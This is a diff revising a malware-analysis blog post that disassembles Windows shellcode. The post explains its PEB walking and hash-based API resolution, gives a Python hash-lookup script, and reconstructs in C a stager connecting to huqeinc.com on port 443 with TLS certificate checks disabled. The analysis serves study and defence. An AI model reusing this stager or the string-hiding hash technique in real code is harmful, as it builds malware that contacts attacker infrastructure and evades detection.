@@ -130,7 +130,7 @@ Moving on, we push another constant (0x726774c) - this one does not decode to an
 
 The code at offset 6 starts with a few interesting instructions:
 ```assembly
-0x0000000000000006:  60                         pushal     
+0x0000000000000006:  60                         pushad     
 0x0000000000000007:  89 E5                      mov        ebp, esp
 0x0000000000000009:  31 D2                      xor        edx, edx
 0x000000000000000b:  64 8B 52 30                mov        edx, dword ptr fs:[edx + 0x30]
@@ -145,13 +145,13 @@ Then, `edx` gets the address of `fs:[0x30]`. This address is the [Process Enviro
 The PEB is a block in usermode that contains useful data from the process to use, including its commandline, debugging status, loaded modules and others. It's a performance enhancement to avoid unnecessary kernel syscalls.
 We see several addresses being referenced - in IDA you could load the PEB structure, but just for the sake of completeness:
 - Offset 0xc is the `LDR` member of the `PEB`, which has a type of `PPEB_LDR_DATA`, which is documented [here](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data).
-- Offset 0x14` in the `PEB_LDR_DATA` structure is the `InMemoryOrderModuleList` member, of type `LIST_ENTRY`. The `LIST_ENTRY` structure is used extensively in Windows, an is usually just a header in a larger structure. This case is no exception - the real type of the entries is `LDR_DATA_TABLE_ENTRY`.
-- At offset 0x24 in the `LDR_DATA_TABLE_ENTRY` there exists a member FullDllName of type `UNICODE_STRING`. That type is used extensively in Windows, and is essentially a container for a Pascal-string - first two WORDs describe the length of the string and its buffer capacity. Therefore, at 0x28 we will bind the actual buffer - which will be saved in the `esi` register.
+- Offset 0x14 in the `PEB_LDR_DATA` structure is the `InMemoryOrderModuleList` member, of type `LIST_ENTRY`. The `LIST_ENTRY` structure is used extensively in Windows, an is usually just a header in a larger structure. This case is no exception - the real type of the entries is `LDR_DATA_TABLE_ENTRY`.
+- At offset 0x24 in the `LDR_DATA_TABLE_ENTRY` there exists a member BaseDllName of type `UNICODE_STRING`. That type is used extensively in Windows, and is essentially a container for a Pascal-string - first two WORDs describe the length of the string and its buffer capacity. Therefore, at 0x28 we will bind the actual buffer - which will be saved in the `esi` register.
 - The `ecx` register is just 2 bytes before the DLL name buffer - and contains the length of the string.
 
-To summarize, this entire chunk fetches the `FullDllName` in the current PEB module entry - saving the buffer in `esi` and its length in `ecx`.
+To summarize, this entire chunk fetches the `BaseDllName` in the current PEB module entry - saving the buffer in `esi` and its length in `ecx`.
 
-## Hash calculation
+## Module name hash calculation
 Let us examine the next couple of instructions:
 
 ```assembly
@@ -175,11 +175,11 @@ In other words - `edi` is some sort of hash of the string pointed by `esi`. The 
 Translating this logic to Python is quite straightforward:
 
 ```python
-def get_hash(s):
+def get_string_hash(s):
     v = 0
-    for c in s:
+    for c in s.upper():
         v = (v >> 0xd) | ((v & 0x1fff) << 19)
-        v = (v + ord(s.upper())) & 0xffffffff
+        v = (v + ord(c)) & 0xffffffff
     return v
 ```
 
@@ -240,9 +240,7 @@ This part resembles the same hash-calculation we've seen earlier, but instead of
 - The comparison of `al` and `ah` really just compares `al` to zero (NUL terminator), as no operation here touches other bytes of `eax` and we made sure they are zero.
 - Instead of using the `loop` instruction (which interacts with `ecx`), we simply jump back (with `jne`) - as long as we did not encounter a NUL terminator.
 
-To summarize - after calculating a rolling hash on a DLL name, 
-
-
+We expect the next parts to perform some sort of comparison between the different hashes we've calculated (module name, symbol name) and the inputs we've received:
 ```assembly
 0x0000000000000060:  03 7D F8                   add        edi, dword ptr [ebp - 8]
 0x0000000000000063:  3B 7D 24                   cmp        edi, dword ptr [ebp + 0x24]
@@ -258,16 +256,229 @@ To summarize - after calculating a rolling hash on a DLL name,
 0x000000000000007c:  89 44 24 24                mov        dword ptr [esp + 0x24], eax
 0x0000000000000080:  5B                         pop        ebx
 0x0000000000000081:  5B                         pop        ebx
-0x0000000000000082:  61                         popal      
+0x0000000000000082:  61                         popad      
 0x0000000000000083:  59                         pop        ecx
 0x0000000000000084:  5A                         pop        edx
 0x0000000000000085:  51                         push       ecx
 0x0000000000000086:  FF E0                      jmp        eax
+```
+Well, `ebp-8` points exactly to the old `edi` value we pushed - which contained the hash of set module name.
+We add that hash value with the hash value of the exported name, and compare that to the DWORD at `ebp+0x24`.
+Because of an earlier `pushad` instruction, we pushed 8 registers, so this points directly to the last mystery value that was pushed in the beginning (0x726774c)!
+If they are not equal - we jump to offset `0x4a` to move on to the next symbol in the same module.
+Otherwise, we restore the export table into `eax`, dereference 0x24 bytes in (which is the ordinal table) and add to the base `ebx`.
+The ordinal table contains 2 bytes for each entry - and since `ecx` is the entry number, `ebx + ecx*2` is the ordinal value.
+The next couple of lines are straightforward: `0x1c` in the export table is the address of exported functions, and `ebx + ecx*4` represents the function address indexed by `ecx`.
+As can be seen, this value is saved in `eax` and eventually gets called:
+- Saving the `eax` value in `esp + 0x24`, which at this point in time is exactly where the `eax` register was saved in the `pushad` instruction. This ensures `eax` value does not get lost when we run `popad`.
+- Doing two dummy pops to `ebx` to get rid of two previous pushes (the calculated hash and the module entry).
+- Doing a `popad`, which restores all general purpose registers from the stack, but saves `eax` due to our previous override. At this stage the stack and the registered are equal to their original state when entered the function, except `eax` which is a desired function pointer.
+- Popping the return value (pushed from the `call ebp`) into `ecx` and the desired hash into `edx`, and then pushing `ecx` again, essentially getting rid of the mystery hash value in the stack.
+- Performing `jmp eax` at this point finishes the function - the function pointed by `eax` will run, and when it returns it will use the original return value.
+
+The last part of this long logic basically continues to the next module:
+```assembly
 0x0000000000000088:  58                         pop        eax
 0x0000000000000089:  5F                         pop        edi
 0x000000000000008a:  5A                         pop        edx
 0x000000000000008b:  8B 12                      mov        edx, dword ptr [edx]
 0x000000000000008d:  EB 86                      jmp        0x15
 ```
-Let's recall that `edx` points to the current `LDR_DATA_TABLE_ENTRY` entry and `edi` is the module hash.
-After pushing them to the stack (backing them up), the code dereferences `edx` at offset 0x10.
+This will essentially clean-up previous pushes and move to offset 0x15, where the next module is going to be used.
+
+To summarize - the entire shellcode between offset 6 and 0x8d (including) expects parameters to be pushed for a function, followed by a custom hash.
+When the hash is matched - the relevant function is called. It certainly is a nice way to avoid having function name strings in your code!
+
+Since we will be examining those hashes quite a lot, it's good to automate our work.
+Let's reuse the Python scripts we coded earlier and write a function that looks up a given hash:
+
+```python
+import os
+import pefile
+import sys
+
+BASE_DIR = os.path.join(os.environ['WINDIR'], 'system32')
+
+def get_string_hash(s):
+    v = 0
+    for c in s:
+        v = (v >> 0xd) | ((v & 0x1fff) << 19)
+        v = (v + ord(c)) & 0xffffffff
+    return v
+
+def get_lib_hash(s):
+    return get_string_hash(''.join([ i + '\x00' for i in (s + '\x00').upper() ]))
+
+def get_sym_hash(s):
+    return get_string_hash(s + '\x00')
+
+def find_by_hash(hash, dll_postfix):
+    for dll_name in os.listdir(BASE_DIR):
+        if not dll_name.endswith(dll_postfix):
+            continue
+        dll_path = os.path.join(BASE_DIR, dll_name)
+        dll_hash = get_lib_hash(dll_name)
+        pe = pefile.PE(dll_path)
+        if pe is None or not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
+            continue
+        syms = [ sym.name.decode() for sym in pe.DIRECTORY_ENTRY_EXPORT.symbols if sym.name is not None ]
+        for s in syms:
+            if (get_sym_hash(s) + dll_hash) & 0xFFFFFFFF == hash:
+                print('%s!%s' % (dll_name, s))
+                return
+    print('Coult not find hash!')
+
+if __name__ == '__main__':
+    if len(sys.argv) > 1:
+        dll_postfix = '.dll' if len(sys.argv) == 2 else sys.argv[2]
+        num = int(sys.argv[1], 16) if 'x' in sys.argv[1] else int(sys.argv[1])
+        find_by_hash(num, dll_postfix)
+```
+
+For example, when we run `get_hash.py 0x726774c kernel32.dll` we get the output `kernel32.dll!LoadLibraryA`!
+
+## Analyzing the main logic
+Now that we understand how the entire hashing functionality works, it's time hash-hunting!
+Let us get back to the main logic - we said the string `wininet` is pushed to the stack - and now we know `LoadLibraryA` is called with it.
+The next parts are now:
+
+```assembly
+0x00000000000000a2:  E8 00 00 00 00             call       0xa7
+0x00000000000000a7:  31 FF                      xor        edi, edi
+0x00000000000000a9:  57                         push       edi
+0x00000000000000aa:  57                         push       edi
+0x00000000000000ab:  57                         push       edi
+0x00000000000000ac:  57                         push       edi
+0x00000000000000ad:  57                         push       edi
+0x00000000000000ae:  68 3A 56 79 A7             push       0xa779563a
+0x00000000000000b3:  FF D5                      call       ebp
+```
+
+The `call` there pushes the return address to the stack (0xa7).
+Then, we nullify `edi` and 5 zeros into the stack. The `0xa779563a` is another hash, this time in `wininet.dll`, as `get_hash.py 0xa779563a` yields `wininet.dll!InternetOpenA`.
+Therefore, the code calls [InternetOpenA](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena) with all zeros and NULLs.
+There are a couple of jumps that end up in a call back to offset 0xba:
+```assembly
+0x00000000000000b5:  E9 A4 00 00 00             jmp        0x15e
+0x00000000000000ba:  5B                         pop        ebx
+...
+0x000000000000015e:  E9 C9 01 00 00             jmp        0x32c
+...
+0x000000000000032c:  E8 89 FD FF FF             call       0xba
+0x0000000000000331:  68 75 71 65 69             push       0x69657175
+0x0000000000000336:  E6                         outs       dx, byte ptr ds:[esi]
+...
+```
+
+The idea is that when we return - we will have address of offset `0x331` pushed.
+I added a couple of assembly instructions at that address - note that `outs`, for instance, is not something we expect.
+Examining those bytes *as data* gives a different story:
+
+```python
+binascii.unhexlify('68757165696e632e636f6d005d44fd6d')
+```
+
+This yields the string `huqeinc.com` (with a NUL terminator), followed by 4 unintelligible bytes.
+So, when we go back to address `0xba` we pop to `ebx`, which will point to that string.
+Let us examine the parts following that instruction:
+
+```assembly
+0x00000000000000bb:  31 C9                      xor        ecx, ecx
+0x00000000000000bd:  51                         push       ecx
+0x00000000000000be:  51                         push       ecx
+0x00000000000000bf:  6A 03                      push       3
+0x00000000000000c1:  51                         push       ecx
+0x00000000000000c2:  51                         push       ecx
+0x00000000000000c3:  68 BB 01 00 00             push       0x1bb
+0x00000000000000c8:  53                         push       ebx
+0x00000000000000c9:  50                         push       eax
+0x00000000000000ca:  68 57 89 9F C6             push       0xc69f8957
+0x00000000000000cf:  FF D5                      call       ebp
+```
+
+The value `0xc69f8957` is another hash, this time for `wininet.dll!InternetConnectA`.
+That function gets lots of parameters, but essentially we get: `InternetConnectA(hInternet, "huqeinc.com", 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL)`.
+Note that `INTERNET_SERVICE_HTTP` is 3, `0x1bb` is 443, and `eax` contained the result from `InternetOpenA`.
+
+Moving forward, we see a similar set of jumps after backing up the result from `InternetConnectA`:
+
+```assembly
+0x00000000000000d1:  50                         push       eax
+0x00000000000000d2:  E9 8C 00 00 00             jmp        0x163
+0x00000000000000d7:  5B                         pop        ebx
+0x00000000000000d8:  31 D2                      xor        edx, edx
+0x00000000000000da:  52                         push       edx
+0x00000000000000db:  68 00 32 C0 84             push       0x84c03200
+0x00000000000000e0:  52                         push       edx
+0x00000000000000e1:  52                         push       edx
+0x00000000000000e2:  52                         push       edx
+0x00000000000000e3:  53                         push       ebx
+0x00000000000000e4:  52                         push       edx
+0x00000000000000e5:  50                         push       eax
+0x00000000000000e6:  68 EB 55 2E 3B             push       0x3b2e55eb
+0x00000000000000eb:  FF D5                      call       ebp
+...
+0x0000000000000163:  E8 6F FF FF FF             call       0xd7
+0x0000000000000168:  2F                         das        
+0x0000000000000169:  51                         push       ecx
+0x000000000000016a:  70 59                      jo         0x1c5
+...
+```
+
+Just as before, the instructions after the call make less sense, so we suspect they should be interpreted as data.
+Indeed, they encode the NUL-terminated string `/QpYB`, which is not super-helpful. We note that when we get back to offset 0xd7, a pointer to that string is pushed to the stack.
+Going back to 0xd7, that address is popped to `ebx`. To understand what that data means, let's figure out what function is called.
+The hash `0x3b2e55eb` yields `wininet.dll!HttpOpenRequestA`, which also gets many parameters.
+Most of those parameters are going to be NULLs (due to the push of `edx`), except the following:
+- `hConnect` is `eax`, which is the result from `InternetConnectA`.
+- `lpszObjectName` is the string that we saw (`/QpYB`).
+- `dwFlags` contain the value 0x84c03200, which, according to [this](https://learn.microsoft.com/en-us/windows/win32/wininet/api-flags), is `INTERNET_FLAG_NO_UI | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD`.
+
+The next couple of instructions ends with yet another API call:
+
+```assembly
+0x00000000000000ed:  89 C6                      mov        esi, eax
+0x00000000000000ef:  83 C3 50                   add        ebx, 0x50
+0x00000000000000f2:  68 80 33 00 00             push       0x3380
+0x00000000000000f7:  89 E0                      mov        eax, esp
+0x00000000000000f9:  6A 04                      push       4
+0x00000000000000fb:  50                         push       eax
+0x00000000000000fc:  6A 1F                      push       0x1f
+0x00000000000000fe:  56                         push       esi
+0x00000000000000ff:  68 75 46 9E 86             push       0x869e4675
+0x0000000000000104:  FF D5                      call       ebp
+```
+
+After backing up the results from `HttpOpenRequestA` with `esi`, we add `ebx` with 0x50.
+Since `ebx` is guaranteed to persist between calls, it'll now point to offset `0x1b8` in the shellcode, which, when presented as string, looks like this: `'User-Agent: Microsoft-CryptoAPI/6.1\r\n`.
+The hash `0x869e4675` resolves the API `wininet.dll!InternetSetOptionA`, which will get the following arguments:
+- The request handle that was saved in `esi`.
+- The value `0x1f` as `dwOption`, which is `INTERNET_OPTION_SECURITY_FLAGS` according to [this](https://learn.microsoft.com/en-us/windows/win32/wininet/option-flags).
+- The `lpBuffer` parameter will be a pointer to the value `0x3380`, which encodes security flags for the request: `WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 | SECURITY_FLAG_IGNORE_UNKNOWN_CA | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID`.
+- The `dwBufferLength` is 4, as only a DWORD was set as the `lpBuffer`.
+
+This will make the connection is TLS but ignore all TLS certificate errors.
+
+
+
+
+```c
+HINTERNET hInternet;
+HINTERNET hConnect;
+HINTERNET hRequest;
+DWORD dwSecurityOptions = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 | SECURITY_FLAG_IGNORE_UNKNOWN_CA | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+
+LoadLibraryA("wininet");
+hInternet = InternetOpenA(NULL, 0, NULL, NULL, 0);
+hConnect = InternetConnectA(hInternet, "huqeinc.com", 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
+hRequest = HttpOpenRequestA(hConnect, NULL, "/QpYB", NULL, NULL, NULL, INTERNET_FLAG_NO_UI | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD, NULL);
+InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecurityOptions, sizeof(dwSecurityOptions));
+```
+
+
+
+
+
+
+
+
